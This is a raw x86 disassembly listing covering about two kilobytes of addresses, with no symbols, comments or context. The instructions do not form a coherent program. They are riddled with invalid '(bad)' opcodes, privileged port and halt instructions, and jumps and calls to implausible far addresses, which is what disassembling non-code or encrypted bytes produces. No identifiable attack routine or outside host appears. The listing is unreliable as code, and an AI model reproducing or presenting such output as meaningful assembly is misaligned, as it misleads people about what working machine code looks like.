  407aee:	pop    esp
  407aef:	test   al,0x26
  407af1:	fsub   QWORD PTR ds:0x442d6915
  407af7:	test   DWORD PTR [ebp+0x43],esp
  407afa:	xor    BYTE PTR [ecx],dh
  407afc:	adc    ah,BYTE PTR [edi+0x66]
  407aff:	mov    eax,0x95f97100
  407b04:	push   es
  407b05:	rol    BYTE PTR [edi],1
  407b07:	sbb    eax,0x5938d882
  407b0c:	outs   dx,BYTE PTR ds:[esi]
  407b0d:	movsx  esp,WORD PTR [ecx]
  407b10:	(bad)  
  407b11:	in     eax,0xce
  407b13:	jae    0x407ab9
  407b15:	mov    fs,WORD PTR [ebx+0x1733025d]
  407b1b:	lock cmp dl,BYTE PTR [ebp+esi*4+0x1f]
  407b20:	mov    dl,0x68
  407b22:	js     0x407b7a
  407b24:	cmp    BYTE PTR [edi-0x3ea94aee],0xd3
  407b2b:	ins    DWORD PTR es:[edi],dx
  407b2c:	mov    bh,BYTE PTR [ebp+0x40beadc2]
  407b32:	mov    ah,0xca
  407b34:	inc    ebp
  407b35:	mov    ah,0x8d
  407b37:	outs   dx,DWORD PTR ds:[esi]
  407b38:	inc    eax
  407b39:	out    0x7,al
  407b3b:	push   esp
  407b3c:	lods   eax,DWORD PTR ds:[esi]
  407b3d:	into   
  407b3e:	inc    ebp
  407b3f:	repz mov cl,0x70
  407b42:	iret   
  407b43:	mov    bl,0x61
  407b45:	cli    
  407b46:	mov    ebp,ds
  407b48:	dec    esi
  407b49:	jne    0x407b00
  407b4b:	(bad)  
  407b4c:	ja     0x407b18
  407b4e:	aaa    
  407b4f:	pop    esi
  407b50:	push   ebx
  407b51:	aaa    
  407b52:	sbb    dh,BYTE PTR [edi]
  407b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b55:	jmp    0x661c3ba6
  407b5a:	fwait
  407b5b:	push   ds
  407b5c:	push   ebp
  407b5d:	scas   eax,DWORD PTR es:[edi]
  407b5e:	add    DWORD PTR [edi+eiz*1],edi
  407b61:	xchg   DWORD PTR [ebx-0x1896b5e3],ecx
  407b67:	adc    edx,DWORD PTR [ecx+0x64470e2e]
  407b6d:	adc    eax,0x7eae56b1
  407b72:	rcl    ebx,cl
  407b74:	(bad)  
  407b75:	frstor [ebx+0x18f6341f]
  407b7b:	fcom   DWORD PTR [eax]
  407b7d:	cmp    bh,BYTE PTR [edx+0xb]
  407b80:	mov    ebx,0x81baec61
  407b85:	jg     0x407bfb
  407b87:	mov    dl,0x1d
  407b89:	inc    ebp
  407b8a:	and    eax,DWORD PTR [edx]
  407b8c:	jg     0x407b54
  407b8e:	sar    DWORD PTR [esi+0x1fc55816],1
  407b94:	retf   0x5b60
  407b97:	vshufps ymm0,ymm7,YMMWORD PTR [ecx],0x94
  407b9c:	out    dx,al
  407b9d:	dec    esp
  407b9e:	adc    DWORD PTR [edi-0x5038ddf6],eax
  407ba4:	iret   
  407ba5:	push   ds
  407ba6:	mov    ebx,0x4fc2b95
  407bab:	cdq    
  407bac:	sub    cl,ch
  407bae:	imul   edx,DWORD PTR [ecx-0x8],0x9dabfb5e
  407bb5:	jae    0x407b79
  407bb7:	stos   DWORD PTR es:[di],eax
  407bb9:	jno    0x407b3b
  407bbb:	add    bl,BYTE PTR [ecx-0x18]
  407bbe:	fs jmp 0x407b82
  407bc1:	loopne 0x407b94
  407bc3:	mov    ah,0x5b
  407bc5:	mov    eax,0x775f81e0
  407bca:	mov    edx,0x8bfaec94
  407bcf:	ins    DWORD PTR es:[edi],dx
  407bd0:	sbb    BYTE PTR [edi-0x5977d90f],bl
  407bd6:	(bad)  
  407bd7:	mov    al,ds:0x9e9ca306
  407bdc:	neg    ebx
  407bde:	jo     0x407c4c
  407be0:	(bad)  
  407be1:	fcom   DWORD PTR [edi-0x41680927]
  407be7:	or     al,0x66
  407be9:	push   cs
  407bea:	cmp    DWORD PTR [ebp+ebp*2+0x58b03a0d],0x61
  407bf2:	xchg   ebx,eax
  407bf3:	dec    edi
  407bf4:	hlt    
  407bf5:	out    dx,al
  407bf6:	xchg   esp,eax
  407bf7:	mov    edi,0x22a5d966
  407bfc:	or     DWORD PTR [ecx+ecx*2+0x348909c],eax
  407c03:	dec    esi
  407c04:	sbb    eax,0xc2306d6d
  407c09:	xchg   esp,eax
  407c0a:	push   ebx
  407c0b:	and    eax,0x4a9ec129
  407c10:	call   0xa8e4622c
  407c15:	xchg   ecx,eax
  407c16:	xchg   ebx,eax
  407c17:	(bad)  
  407c18:	retf   
  407c19:	mov    ds:0x6392162d,eax
  407c1e:	adc    DWORD PTR [ebx+0x5db80351],esp
  407c24:	inc    esi
  407c25:	loop   0x407c68
  407c27:	repnz push esi
  407c29:	rol    BYTE PTR [ecx],1
  407c2b:	sbb    BYTE PTR [edi+edi*1],cl
  407c2e:	mov    ds:0xf527820,eax
  407c33:	adc    BYTE PTR [esi],bh
  407c35:	mov    gs,WORD PTR [ebp+0x582df62f]
  407c3b:	in     eax,0x53
  407c3d:	icebp  
  407c3e:	mov    ah,0xdb
  407c40:	int3   
  407c41:	lea    edx,[ebp+0x5aad751b]
  407c47:	in     al,0xe7
  407c49:	inc    eax
  407c4a:	or     eax,0xaaff151d
  407c4f:	test   BYTE PTR [ebp+0x68],al
  407c52:	sub    BYTE PTR [eax-0x2e43a48d],bl
  407c58:	sbb    al,0xac
  407c5a:	shr    DWORD PTR [esi],0x55
  407c5d:	sub    bl,bh
  407c5f:	outs   dx,DWORD PTR ds:[esi]
  407c60:	mov    ebp,esp
  407c62:	add    eax,0x2bcbecbe
  407c67:	stos   DWORD PTR es:[edi],eax
  407c68:	adc    ch,BYTE PTR [ebp-0x19693d23]
  407c6e:	jno    0x407c24
  407c70:	mov    WORD PTR es:[edi-0x51e7d799],ds
  407c77:	xor    edx,DWORD PTR [edx+0x32]
  407c7a:	sub    DWORD PTR [eax],0xc25abc6b
  407c80:	test   edi,eax
  407c82:	jl     0x407c0b
  407c84:	ficom  WORD PTR [edi-0x6a9d823a]
  407c8a:	mov    esi,0xe4993557
  407c8f:	(bad)  
  407c90:	sbb    eax,0x7756210
  407c95:	mov    al,ds:0xe3c53415
  407c9a:	push   es
  407c9b:	mov    dh,0x4
  407c9d:	jbe    0x407c82
  407c9f:	xchg   ecx,eax
  407ca0:	ficomp DWORD PTR [esi+0x6648aeec]
  407ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ca7:	pop    esi
  407ca8:	mov    al,ds:0xc9b9e330
  407cad:	add    eax,0x10f1ccc9
  407cb2:	mov    al,ds:0x416289d6
  407cb7:	scas   al,BYTE PTR es:[edi]
  407cb8:	sti    
  407cb9:	dec    DWORD PTR [ebp+0x16]
  407cbc:	xchg   edi,eax
  407cbd:	hlt    
  407cbe:	(bad)  [ecx-0x4e]
  407cc1:	hlt    
  407cc2:	lock mov edx,0x3ca96976
  407cc8:	loope  0x407cc0
  407cca:	sbb    bl,BYTE PTR [edx+0x1e]
  407ccd:	call   0xe6a78dbe
  407cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cd3:	std    
  407cd4:	cld    
  407cd5:	pop    eax
  407cd6:	jecxz  0x407cee
  407cd8:	out    0xa9,al
  407cda:	rcr    DWORD PTR [esi+0x2b3e3d09],0x10
  407ce1:	jg     0x407ca1
  407ce3:	cmp    bl,al
  407ce5:	mov    ah,0x3
  407ce7:	pop    ecx
  407ce8:	push   edi
  407ce9:	pop    edx
  407cea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ceb:	daa    
  407cec:	imul   cl
  407cee:	call   0x9fca563
  407cf3:	pop    esi
  407cf4:	mov    ecx,0x3708808e
  407cf9:	shr    DWORD PTR [edx],cl
  407cfb:	push   ds
  407cfc:	lahf   
  407cfd:	pop    edx
  407cfe:	jbe    0x407cc5
  407d00:	setge  BYTE PTR [edx]
  407d03:	sub    al,0xc3
  407d05:	loopne 0x407cdf
  407d07:	dec    BYTE PTR [edi]
  407d09:	imul   edx,DWORD PTR [edx-0x7d],0x6
  407d0d:	sub    eax,0xf9943368
  407d12:	aaa    
  407d13:	push   edi
  407d14:	add    ah,dl
  407d16:	fiadd  WORD PTR [edi-0xe]
  407d19:	clc    
  407d1a:	push   ds
  407d1b:	inc    ecx
  407d1c:	cdq    
  407d1d:	imul   esi,esp,0x6cb08092
  407d23:	push   edx
  407d24:	xor    DWORD PTR [edx],0x1fba1ac2
  407d2a:	enter  0xedf4,0x0
  407d2e:	hlt    
  407d2f:	call   0x7b0f54ad
  407d34:	bound  esp,QWORD PTR [ebp+eiz*4-0x42df6e7f]
  407d3b:	shl    BYTE PTR [ebx],cl
  407d3d:	cmp    DWORD PTR ds:0xaf4d1b1,esi
  407d43:	in     eax,0xfe
  407d45:	dec    eax
  407d46:	sbb    eax,0xeb243f02
  407d4b:	mov    edx,0xe325e86d
  407d50:	int3   
  407d51:	mov    al,0x8b
  407d53:	inc    ecx
  407d54:	fwait
  407d55:	test   BYTE PTR [ebx],bh
  407d57:	adc    eax,0x8e790a65
  407d5c:	pop    esp
  407d5d:	shl    BYTE PTR [ebx-0x11],1
  407d60:	jle    0x407db6
  407d62:	jbe    0x407d6b
  407d64:	imul   eax,edi,0xffffffc1
  407d67:	rcr    ecx,1
  407d69:	out    0xc9,eax
  407d6b:	mov    eax,ds:0x2a133a86
  407d70:	mov    dh,0x79
  407d72:	ins    BYTE PTR es:[edi],dx
  407d73:	jle    0x407db5
  407d75:	push   eax
  407d76:	cli    
  407d77:	add    al,bh
  407d79:	adc    al,0xa8
  407d7b:	imul   eax,DWORD PTR [edi+0x35],0xfffffff2
  407d7f:	cmp    eax,0x2f3f1b53
  407d84:	push   edx
  407d85:	rcr    DWORD PTR [edi],1
  407d87:	xor    al,0xd1
  407d89:	jb     0x407dbf
  407d8b:	push   ss
  407d8c:	out    dx,eax
  407d8d:	add    esp,DWORD PTR [edx-0x6b5873eb]
  407d93:	dec    ecx
  407d94:	mov    esi,0xb4ba161e
  407d99:	hlt    
  407d9a:	jne    0x407d29
  407d9c:	and    eax,0x2996319
  407da1:	je     0x407dbb
  407da3:	data16 jp 0x407d57
  407da6:	in     al,0xe8
  407da8:	add    edx,DWORD PTR [edi-0x485b688b]
  407dae:	ins    BYTE PTR es:[edi],dx
  407daf:	andps  xmm1,XMMWORD PTR [esp+ebp*2]
  407db3:	sbb    eax,0x226a2a31
  407db8:	ja     0x407dba
  407dba:	rol    BYTE PTR [edi],1
  407dbc:	add    BYTE PTR [ecx+0x6aa80c1e],dl
  407dc2:	mov    ch,0x1c
  407dc4:	dec    esp
  407dc5:	lods   eax,DWORD PTR ds:[esi]
  407dc6:	fnstsw WORD PTR [ecx]
  407dc8:	jmp    0x407df7
  407dca:	adc    dh,cl
  407dcc:	js     0x407dbe
  407dce:	jge    0x407dbd
  407dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dd1:	aaa    
  407dd2:	cmp    DWORD PTR [edi+0x39be724f],esi
  407dd8:	sahf   
  407dd9:	mov    edx,0x6fba7c6b
  407dde:	loopne 0x407e53
  407de0:	out    dx,al
  407de1:	les    ebx,FWORD PTR [edx+eax*2]
  407de4:	aad    0x74
  407de6:	hlt    
  407de7:	add    DWORD PTR [edi+0x7b],esi
  407dea:	adc    cl,BYTE PTR [ebx-0x71]
  407ded:	fsub   st(5),st
  407def:	sbb    edi,DWORD PTR [eax+0x6aef805e]
  407df5:	xlat   BYTE PTR ds:[ebx]
  407df6:	mov    esp,0xbc12b06f
  407dfb:	inc    ecx
  407dfc:	cmp    DWORD PTR [esi+edx*8-0x18],edx
  407e00:	lods   eax,DWORD PTR ds:[esi]
  407e01:	ins    BYTE PTR es:[edi],dx
  407e02:	fst    DWORD PTR ds:0x5bda4336
  407e08:	jb     0x407ddd
  407e0a:	mov    bh,0x17
  407e0c:	mov    ebx,0x86b0ea46
  407e11:	(bad)  
  407e12:	mov    ebx,0xbef5f6c4
  407e17:	shl    DWORD PTR [edx+0x6653f07e],cl
  407e1d:	arpl   sp,bx
  407e1f:	stos   DWORD PTR es:[edi],eax
  407e20:	out    dx,al
  407e21:	ss in  eax,dx
  407e23:	ss cs call 0xb4fa:0xd3ae0e36
  407e2c:	mov    ch,0x34
  407e2e:	add    DWORD PTR [ebp+0x1a9da232],eax
  407e34:	in     eax,0x92
  407e36:	popf   
  407e37:	sbb    DWORD PTR [esi-0x27dcdb3b],ebp
  407e3d:	(bad)  
  407e3e:	mov    edx,0xbfd5dd17
  407e43:	nop
  407e44:	sub    DWORD PTR [edi+0x120c3514],esi
  407e4a:	cmp    esi,ecx
  407e4c:	ins    DWORD PTR es:[edi],dx
  407e4d:	pop    esi
  407e4e:	jne    0x407e03
  407e50:	sbb    eax,0xa2203809
  407e55:	inc    ebx
  407e56:	js     0x407de3
  407e58:	outs   dx,BYTE PTR ds:[esi]
  407e59:	jae    0x407e2b
  407e5b:	sub    BYTE PTR ds:0xae5a034c,dl
  407e61:	mov    dl,0x3d
  407e63:	pop    ebp
  407e64:	outs   dx,BYTE PTR ds:[esi]
  407e65:	jns    0x407e49
  407e67:	pop    eax
  407e68:	in     eax,dx
  407e69:	das    
  407e6a:	mov    ah,0x87
  407e6c:	retf   0x229f
  407e6f:	aad    0x87
  407e71:	mov    bl,0x67
  407e73:	popf   
  407e74:	lock jnp 0x407e0f
  407e77:	jle    0x407ee1
  407e79:	push   es
  407e7a:	adc    BYTE PTR [ecx-0x4ac16ec0],al
  407e80:	xchg   esi,eax
  407e81:	pop    ebx
  407e82:	out    0x65,eax
  407e84:	ja     0x407e6a
  407e86:	xor    DWORD PTR [esi-0x73387edc],esp
  407e8c:	inc    esi
  407e8d:	out    dx,al
  407e8e:	cmp    edx,DWORD PTR [esi]
  407e90:	pop    esp
  407e91:	sub    eax,0x17630f44
  407e96:	or     DWORD PTR [ebp-0x6a],esp
  407e99:	(bad)  
  407e9b:	out    dx,al
  407e9c:	xor    esp,ebp
  407e9e:	mov    DWORD PTR [ecx],esi
  407ea0:	mov    ebx,0x1e56363
  407ea5:	popf   
  407ea6:	stos   BYTE PTR es:[edi],al
  407ea7:	(bad)  
  407ea8:	lock push ss
  407eaa:	inc    edx
  407eab:	xor    DWORD PTR [ebp-0x7],0xe1fdbc43
  407eb2:	cmp    ecx,DWORD PTR [esi]
  407eb4:	or     cl,ah
  407eb6:	or     ecx,DWORD PTR [esi-0x7fcf971f]
  407ebc:	mov    ds:0x6b0f3f80,eax
  407ec1:	cmp    eax,DWORD PTR [esi]
  407ec3:	inc    esp
  407ec4:	mov    edx,0x73bc5b90
  407ec9:	add    edi,DWORD PTR [edi+eax*4]
  407ecc:	jns    0x407ecc
  407ece:	fwait
  407ecf:	jo     0x407e9d
  407ed1:	adc    al,0xb5
  407ed3:	fwait
  407ed4:	and    edi,ebx
  407ed6:	pop    ebp
  407ed7:	dec    esi
  407ed8:	sbb    eax,0x43f822ca
  407edd:	test   al,0xca
  407edf:	jae    0x407f28
  407ee1:	sti    
  407ee2:	pop    ds
  407ee3:	call   0x4c27:0x89f
  407ee9:	adc    DWORD PTR [ebp-0x2f],ecx
  407eec:	inc    esi
  407eed:	cmp    edi,esi
  407eef:	(bad)  
  407ef0:	ds pop ecx
  407ef2:	sahf   
  407ef3:	fsubr  QWORD PTR [edi-0x2858d56d]
  407ef9:	icebp  
  407efa:	and    dh,BYTE PTR [ecx]
  407efc:	out    0x11,eax
  407efe:	cmp    eax,0xf6605045
  407f03:	xor    eax,0xd478d7f3
  407f08:	mov    esp,0xb7b252a9
  407f0d:	pop    eax
  407f0e:	or     ah,BYTE PTR [ecx]
  407f10:	xchg   ecx,eax
  407f11:	adc    esp,DWORD PTR [ebx+0x27]
  407f14:	mov    WORD PTR ds:0x5c9ff77a,?
  407f1a:	adc    edx,DWORD PTR [ecx+0x4cde4532]
  407f20:	es sub al,0x99
  407f23:	cmp    eax,0xf4214e
  407f28:	adc    eax,0xdfeb1c55
  407f2d:	adc    dl,BYTE PTR [edx+0x32ead19d]
  407f33:	jecxz  0x407faf
  407f35:	jge    0x407ebe
  407f37:	adc    al,BYTE PTR [edi]
  407f39:	add    eax,0xecb4cdd5
  407f3e:	push   ds
  407f3f:	pop    ecx
  407f40:	xchg   esi,eax
  407f41:	in     al,dx
  407f42:	mov    esp,0x29c887d3
  407f47:	cmp    al,0x5a
  407f49:	cdq    
  407f4a:	dec    ebx
  407f4b:	pushw  cs
  407f4d:	out    dx,eax
  407f4e:	jnp    0x407f5d
  407f50:	mov    ebp,0xb43b9b19
  407f55:	into   
  407f56:	popa   
  407f57:	inc    ebp
  407f58:	adc    eax,0xb2064155
  407f5d:	shr    BYTE PTR [edx+edx*4],0xc
  407f61:	inc    eax
  407f62:	push   0x6
  407f64:	std    
  407f65:	xchg   edi,eax
  407f66:	sub    al,BYTE PTR [edx-0x47]
  407f69:	mov    eax,ds:0xb410596b
  407f6e:	push   cs
  407f6f:	data16 mov dl,0xa7
  407f72:	jmp    0xad4f:0x25b3cb96
  407f79:	pushf  
  407f7a:	mov    dh,0xbf
  407f7c:	mov    al,ds:0x4b2b6c9
  407f81:	mov    ds:0xbcab6f84,eax
  407f86:	sahf   
  407f87:	add    BYTE PTR [edx-0x6f72c66],ah
  407f8d:	push   eax
  407f8e:	dec    esp
  407f8f:	daa    
  407f90:	dec    ebx
  407f91:	jmp    0x407ffe
  407f93:	sub    BYTE PTR [edx],0x9b
  407f96:	dec    ecx
  407f97:	mov    bh,0xe2
  407f99:	sahf   
  407f9a:	shl    BYTE PTR [edx],0x90
  407f9d:	add    bl,BYTE PTR [eax]
  407f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fa0:	xchg   esi,eax
  407fa1:	loop   0x407f25
  407fa3:	or     DWORD PTR [edx+0x116d89c0],eax
  407fa9:	pushf  
  407faa:	(bad)  
  407fab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fac:	mov    eax,0x21e1fbcb
  407fb1:	adc    al,0xd2
  407fb3:	xchg   edi,ebx
  407fb5:	mov    DWORD PTR [edx],edx
  407fb7:	(bad)  
  407fb8:	add    al,0xbc
  407fba:	add    DWORD PTR [edx],eax
  407fbc:	mov    esp,0x4c86fdd0
  407fc1:	pusha  
  407fc2:	sbb    cl,BYTE PTR [esi-0x50]
  407fc5:	jo     0xa142355b
  407fcb:	or     edi,esp
  407fcd:	mov    esp,0xc1017d4a
  407fd2:	xchg   ecx,eax
  407fd3:	data16 loope 0x407fb2
  407fd6:	inc    ebp
  407fd7:	inc    eax
  407fd8:	jge    0x407ffd
  407fda:	lods   al,BYTE PTR ds:[esi]
  407fdb:	adc    eax,0xa2bbf2d9
  407fe0:	jae    0x407fbb
  407fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fe3:	imul   ebp,edi,0xffffffdc
  407fe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fe7:	mov    esi,0x44ec6373
  407fec:	push   ecx
  407fed:	and    ah,BYTE PTR [edx]
  407fef:	push   ecx
  407ff0:	fldpi  
  407ff2:	std    
  407ff3:	mov    edx,0x2204112e
  407ff8:	xchg   edx,eax
  407ff9:	sbb    al,0x20
  407ffb:	pop    ebp
  407ffc:	push   edx
  407ffd:	cmp    ebp,DWORD PTR [ecx+0x71ba2f87]
  408003:	add    BYTE PTR [edi+0x43],cl
  408006:	cmp    eax,0xeaf54553
  40800b:	jle    0x408030
  40800d:	jbe    0x407fea
  40800f:	inc    edx
  408010:	test   DWORD PTR [ebx-0x3e],ecx
  408013:	fsub   st,st(1)
  408015:	xor    DWORD PTR [ebp+0x1e],esi
  408018:	clc    
  408019:	dec    ebx
  40801a:	mov    esi,0x1dab69fd
  40801f:	xor    al,0x93
  408021:	(bad)  
  408022:	cmp    dh,BYTE PTR [eax+ebp*2-0x1a]
  408026:	stc    
  408027:	add    ebp,ebp
  408029:	xlat   BYTE PTR ds:[ebx]
  40802a:	jmp    0x5864f744
  40802f:	sbb    al,cl
  408031:	out    0xf7,eax
  408033:	nop
  408034:	xor    BYTE PTR [esi+ebx*8+0x2ae6817a],dl
  40803b:	cmc    
  40803c:	dec    edi
  40803d:	sub    ecx,DWORD PTR [ebx-0x2ad9a1a3]
  408043:	jmp    0x408056
  408045:	jmp    0x40808a
  408047:	iret   
  408048:	mov    eax,0x50ccd603
  40804d:	sbb    eax,0xae7ad4d1
  408052:	jle    0x408090
  408054:	ret    
  408055:	xchg   edi,eax
  408056:	fild   QWORD PTR [esi+eax*2-0x58]
  40805a:	add    BYTE PTR [eax+0xf],bl
  40805d:	sbb    eax,0x27ee79a2
  408062:	icebp  
  408063:	ins    DWORD PTR es:[edi],dx
  408064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408065:	clc    
  408066:	sbb    al,0xfc
  408068:	dec    ebx
  408069:	and    eax,0x87a4bab2
  40806e:	aam    0x32
  408070:	mov    ds:0xf53d31b7,al
  408075:	dec    esi
  408076:	aaa    
  408077:	or     edi,0xffffff8a
  40807a:	add    al,0xc1
  40807c:	jbe    0x40804d
  40807e:	ret    0xdbed
  408081:	or     al,0x1c
  408083:	imul   edi,DWORD PTR [eax-0x6cb07a93],0xc916ff2d
  40808d:	pop    edx
  40808e:	test   BYTE PTR [ebp-0x4b27b180],ah
  408094:	mov    al,ds:0x5070a96
  408099:	repnz sub edi,eax
  40809c:	out    dx,eax
  40809d:	xor    al,0x24
  40809f:	adc    al,0xeb
  4080a1:	sub    eax,0xc28e967
  4080a6:	pop    ecx
  4080a7:	pushf  
  4080a8:	fcom   st(4)
  4080aa:	ins    DWORD PTR es:[edi],dx
  4080ab:	bnd jne 0x408112
  4080ae:	(bad)  
  4080af:	push   0xffffffcd
  4080b1:	and    BYTE PTR [edx+0x65],ch
  4080b4:	lods   eax,DWORD PTR ds:[esi]
  4080b5:	or     esi,ecx
  4080b7:	adc    al,0x36
  4080b9:	out    0xa1,al
  4080bb:	add    al,0x5c
  4080bd:	xor    ch,dl
  4080bf:	fist   WORD PTR [edi+0x1e6da897]
  4080c5:	(bad)  
  4080c6:	jns    0x408058
  4080c8:	(bad)  
  4080c9:	jmp    0x488e:0x4d6f562a
  4080d0:	xchg   BYTE PTR [eax+edi*8],bh
  4080d3:	jmp    0x3eb0:0xd6d29c76
  4080da:	push   eax
  4080db:	push   es
  4080dc:	in     eax,dx
  4080dd:	out    dx,eax
  4080de:	in     eax,0x3
  4080e0:	add    dh,0x84
  4080e3:	push   ds
  4080e4:	retf   0x3b0
  4080e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080e8:	ss retf 
  4080ea:	and    ebx,edi
  4080ec:	(bad)  
  4080ed:	enter  0x432b,0x67
  4080f1:	mov    eax,0x25b04e68
  4080f6:	sub    al,0x83
  4080f8:	xor    BYTE PTR [eax+0x3a],ah
  4080fb:	daa    
  4080fc:	cmp    eax,0x139149d1
  408101:	push   ebx
  408102:	imul   esp,DWORD PTR [ecx-0x43],0x5d
  408106:	or     edi,DWORD PTR [esi+0x7527fddb]
  40810c:	dec    eax
  40810d:	mov    ecx,DWORD PTR [ebx+0x35]
  408110:	dec    edx
  408111:	arpl   WORD PTR [ebp-0x39],sp
  408114:	out    dx,eax
  408115:	sbb    eax,0x4a56d350
  40811a:	push   ebx
  40811b:	mov    WORD PTR [ebx],gs
  40811d:	cld    
  40811e:	imul   edi,ebx,0xffffffb2
  408121:	cmp    ah,BYTE PTR [ebx+0x6a]
  408124:	popf   
  408125:	test   BYTE PTR [ebp+0x54210d48],0xc6
  40812c:	dec    ebp
  40812d:	jl     0x408187
  40812f:	hlt    
  408130:	xor    dl,BYTE PTR [ebx]
  408132:	pop    eax
  408133:	adc    DWORD PTR [ebp+ebp*8-0x74],0x25cdbc46
  40813b:	sub    BYTE PTR [eax-0x5f],0x0
  40813f:	inc    edi
  408140:	or     esi,DWORD PTR [edx+0x62]
  408143:	sub    ebp,DWORD PTR ds:0x537e88b3
  408149:	ror    DWORD PTR ds:[ebp-0x14],1
  40814d:	aaa    
  40814e:	add    dh,BYTE PTR [ebx-0x5d]
  408151:	xor    dl,BYTE PTR [ebx+0x2]
  408154:	pop    ss
  408155:	stc    
  408156:	inc    ebx
  408157:	jmp    DWORD PTR [ebp+0x5f]
  40815a:	add    eax,0x235201b8
  40815f:	jo     0x408183
  408161:	shrd   DWORD PTR [esi+0x48a5c68f],esi,0xad
  408169:	call   DWORD PTR [edx+0x78]
  40816c:	mov    DWORD PTR [edx+0x4b],edi
  40816f:	push   eax
  408170:	sbb    eax,DWORD PTR [esi+ecx*8+0x34624703]
  408177:	sbb    ebp,ebx
  408179:	xor    bl,BYTE PTR [ebx]
  40817b:	and    cl,BYTE PTR [esi+0x4b5cd0e5]
  408181:	inc    ebp
  408182:	push   eax
  408183:	mov    al,0xca
  408185:	push   cs
  408186:	(bad)  
  408187:	push   ebx
  408188:	and    al,0x23
  40818a:	sbb    ah,dl
  40818c:	ja     0x40815e
  40818e:	push   edx
  40818f:	fist   WORD PTR [ecx+0x5142ed57]
  408195:	inc    BYTE PTR [ecx]
  408197:	or     DWORD PTR [ebp-0x2ea1d6a4],ebx
  40819d:	xchg   edi,eax
  40819e:	push   edx
  40819f:	inc    esi
  4081a0:	rol    DWORD PTR [ebx-0x80],cl
  4081a3:	jnp    0x408164
  4081a5:	aad    0xa9
  4081a7:	add    eax,0x3b76f344
  4081ac:	idiv   DWORD PTR [esi+edi*8+0x7492ce95]
  4081b3:	loopne 0x40814e
  4081b5:	adc    eax,0xdadef9bb
  4081ba:	aam    0x5b
  4081bc:	dec    esi
  4081bd:	add    DWORD PTR [ecx],ebp
  4081bf:	push   edi
  4081c0:	xchg   BYTE PTR ds:0x89dc2861,ch
  4081c6:	in     al,0x7b
  4081c8:	(bad)  
  4081ca:	mov    ah,0x5b
  4081cc:	or     al,BYTE PTR [ecx]
  4081ce:	pop    ds
  4081cf:	xor    BYTE PTR [esp+eax*1-0x3],0x73
  4081d4:	xchg   ebp,eax
  4081d5:	or     al,0xa
  4081d7:	pusha  
  4081d8:	and    BYTE PTR [eax-0x4c],ch
  4081db:	fdiv   QWORD PTR [ebx-0x35]
  4081de:	push   ecx
  4081df:	mov    ds:0xaf2c9264,al
  4081e4:	rol    BYTE PTR [ebp+0x7d],0x10
  4081e8:	jne    0x408193
  4081ea:	inc    eax
  4081eb:	jbe    0x408212
  4081ed:	cli    
  4081ee:	in     al,0x4e
  4081f0:	mov    edi,0x2d9436fe
  4081f5:	pushf  
  4081f6:	cmp    eax,0x98d0eaa2
  4081fb:	pop    eax
  4081fc:	out    dx,eax
  4081fd:	in     al,0xc
  4081ff:	mov    cl,0x6e
  408201:	push   0x88f8d7be
  408206:	and    DWORD PTR [eax+0x76],esp
  408209:	clc    
  40820a:	add    ebx,DWORD PTR [edi+0x7f49122d]
  408210:	stos   BYTE PTR es:[edi],al
  408211:	sbb    BYTE PTR [eax],ch
  408213:	test   BYTE PTR [esi],0xd4
  408216:	and    DWORD PTR [edi-0x617b1219],0x6aa46adf
  408220:	pusha  
  408221:	aaa    
  408222:	shr    BYTE PTR [edi-0x7ebd85b7],0x29
  408229:	out    0x46,eax
  40822b:	fs push esi
  40822d:	jp     0x408289
  40822f:	fiadd  WORD PTR [edi+0x2f]
  408232:	or     BYTE PTR [ebp-0x3e153c9],cl
  408238:	jp     0x408201
  40823a:	or     eax,0xe93de11
  40823f:	xchg   edx,eax
  408240:	pop    edx
  408241:	call   0x2604:0xdf2111cf
  408248:	cmc    
  408249:	cdq    
  40824a:	jns    0x408218
  40824c:	mov    bl,0x2
  40824e:	push   edi
  40824f:	push   0x5c
  408251:	leave  
  408252:	data16 sti 
  408254:	or     al,BYTE PTR [ebp+0x4f5c4130]
  40825a:	repz cmp bh,BYTE PTR [edi-0x1b]
  40825e:	int3   
  40825f:	push   0x2f
  408261:	xchg   ebp,eax
  408262:	mov    dh,bl
  408264:	pop    edx
  408265:	jle    0x408249
  408267:	jb     0x4082db
  408269:	xor    BYTE PTR [ecx+0x78],dh
  40826c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40826d:	je     0x408281
  40826f:	adc    DWORD PTR [ebx],0x121169ec
  408275:	inc    eax
  408276:	lods   al,BYTE PTR ds:[esi]
  408277:	jle    0x40822d
  408279:	pop    ss
  40827a:	cmp    eax,0xf286921b
  40827f:	sub    al,0x30
  408281:	or     BYTE PTR [esi],bl
  408283:	arpl   ax,bx
  408285:	xchg   BYTE PTR [esp+edx*1+0x38],ch
  408289:	push   edi
  40828a:	mov    ah,0x78
  40828c:	add    DWORD PTR [ebp+0x522dc713],edi
  408292:	jp     0x408281
  408294:	stc    
  408295:	and    ebp,DWORD PTR [eax-0x31]
  408298:	shl    BYTE PTR [esi-0x5438382b],0xb6
  40829f:	adc    eax,0xfa751f6a
  4082a4:	repnz stos BYTE PTR es:[edi],al
  4082a6:	dec    edx
  4082a7:	ja     0x4082c5
  4082a9:	and    edi,DWORD PTR [esi]
  4082ab:	in     al,0x4a
  4082ad:	cdq    
  4082ae:	imul   ebx,esp,0x831c9224
  4082b4:	mov    DWORD PTR [ebx-0x41587e79],0x62c2f34d
  4082be:	mov    ecx,0x5c607e81
  4082c3:	adc    al,0xb8
  4082c5:	call   0xb26b6e4d
  4082ca:	mov    ds:0xa19bd7ab,eax
  4082cf:	(bad)  
  4082d0:	xchg   esp,eax
  4082d1:	jmp    0x3e16:0xacaa3714
  4082d8:	xchg   ebp,eax
  4082d9:	cmp    al,0xcd
  4082db:	es into 
  4082dd:	popf   
  4082de:	sbb    al,0xcd
  4082e0:	sbb    BYTE PTR [ebp+edx*4-0xc978186],0xfe
  4082e8:	inc    ecx
